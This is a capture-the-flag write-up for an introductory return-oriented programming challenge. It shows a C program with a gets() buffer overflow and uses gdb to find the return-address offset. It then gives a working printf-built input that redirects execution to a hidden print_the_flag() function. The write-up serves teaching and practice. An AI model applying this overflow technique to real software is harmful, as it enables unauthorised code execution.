# know-the-ropes writeup

This is a binary exploit challenge, introducing participants to the concept of
*Return-Oriented Programming*, or ROP, for short.

In this challenge, we're given a binary file, that 'as usual' (such as in eg.
`trout`) reads some input. This time, it expects us to enter a flag. But... it
doesn't do much with it?

```c
int main_real(void) {
	char flgin[64];

	printf("Enter flag:\n");
	fflush(stdout);
	gets(flgin);

	if (memcmp(flgin, "FLG{", 4)) {
		fprintf(stderr, "Bad input: must start with 'FLG{'\n");
		return 1;
	}
	if (flgin[48] != '}') {
		fprintf(stderr, "Bad input: must end with '}'\n");
		return 1;
	}

	printf("Thanks for the flag! But did you really think I'd give it to you that easily?\n");

	return 0;
}
```

Hm, what else is there in this binary? Well, there's this interesting function:

```c
void print_the_flag(void) {
	printf("Here's your flag! %s\n", getenv("FLAG"));
	fflush(stdout);
	fprintf(stderr, "As you can see, this function is uncallable. Good luck getting the flag!\n");
}
```

It prints the flag we are after, but, nothing seems to call it.

So how do we exploit this binary?

Well, `main_real()` has the typical `gets()` buffer overflow vulnerability. But
there isn't really that much data to overflow, and we can't really use a
[shellcode](https://en.wikipedia.org/wiki/Shellcode) exploit (where we load
instructions on the stack, and overwrite the return address to that code)
either, as the stack is marked as no-execute...

However, we can still overwrite the return address to point to the
`print_the_flag()` function! To do that, let's try feeding it the following
test string, using `gdb`:

```
FLG{BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM}NNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ[[[[\\\\]]]]^^^^____````
```

```
$ FLAG="FLG{0123456789abcdef0123456789abcdef0123456789ab}" gdb -ex r ./challenge.elf
[...]
Starting program: ./challenge.elf
Enter flag:
FLG{BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM}NNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ[[[[\\\\]]]]^^^^____````
Bad input: must end with '}'

Program received signal SIGSEGV, Segmentation fault.
0x54545454 in ?? ()
```

Aha, it has crashed! It tried to return to `0x54545454`, which corresponds to
the `TTTT` part of our input!

Ghidra tells us `print_the_flag()` lives at address `0x48449200`, so let's try
that:

```
$ printf 'FLG{BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM}NNNOOOOPPPPQQQQRRRRSSSS\x00\x92\x44\x48UUUUVVVVWWWWXXXXYYYYZZZZ[[[[\\\\]]]]^^^^____````\n' > testinput
$ FLAG="FLG{0123456789abcdef0123456789abcdef0123456789ab}" gdb -ex 'r < testinput' ./challenge.elf
[...]
Starting program: ./challenge.elf
Enter flag:
Bad input: must end with '}'
Here's your flag! FLG{0123456789abcdef0123456789abcdef0123456789ab}
As you can see, this function is uncallable. Good luck getting the flag!

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

And it worked. `gets()` doesn't even seem to care about null bytes, which makes
our life easier, and this challenge solved.
